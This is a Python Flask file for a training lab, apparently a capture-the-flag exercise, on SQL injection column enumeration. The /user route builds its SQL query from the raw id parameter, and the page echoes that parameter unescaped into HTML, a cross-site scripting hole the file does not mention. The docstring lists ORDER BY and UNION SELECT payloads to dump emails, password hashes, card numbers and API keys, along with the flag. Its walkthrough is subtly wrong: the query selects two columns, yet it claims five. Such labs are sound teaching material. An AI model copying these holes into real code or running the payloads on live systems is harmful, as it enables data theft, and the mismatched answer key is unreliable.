"""
SQL Injection Lab 11: Column Name Enumeration
Difficulty: 3 (Advanced)
Points: 100

Description:
SQL injection to enumerate table structure.
"""

from flask import Flask, request
import sqlite3

app = Flask(__name__)

DB_PATH = '/tmp/sqli_11.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users 
                      (id INTEGER PRIMARY KEY, email TEXT, password_hash TEXT, 
                       credit_card TEXT, api_key TEXT)''')
    cursor.execute("INSERT OR IGNORE INTO users VALUES (1, 'user@example.com', 'hashed_pwd', '4111111111111111', 'secret_api_key')")
    conn.commit()
    conn.close()

init_db()

@app.route('/user')
def user():
    """
    VULNERABLE: Column enumeration via ORDER BY
    
    Attack Vector:
    /user?id=1 ORDER BY 1 (success)
    /user?id=1 ORDER BY 2 (success)
    /user?id=1 ORDER BY 5 (success - 5 columns)
    /user?id=1 ORDER BY 6 (error - only 5 columns)
    
    Then use UNION to select columns:
    /user?id=1 UNION SELECT 1,2,3,4,5
    /user?id=1 UNION SELECT id,email,password_hash,credit_card,api_key FROM users
    
    Flag: FLAG{sql_injection_column_enum_011}
    """
    user_id = request.args.get('id', '1')
    result = None
    
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        # VULNERABLE: ORDER BY allows column count enumeration
        query = f"SELECT id, email FROM users WHERE id={user_id}"
        cursor.execute(query)
        user = cursor.fetchone()
        
        if user:
            result = f"<p>ID: {user[0]}</p><p>Email: {user[1]}</p>"
        else:
            result = "User not found"
        
        conn.close()
    except Exception as e:
        result = f"Error: {str(e)}"
    
    return f"""
    <html>
    <body>
        <h1>User Viewer</h1>
        <form method="GET">
            <input type="text" name="id" placeholder="User ID" value="{user_id}">
            <button>View</button>
        </form>
        {result if result else ""}
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5011, debug=False)
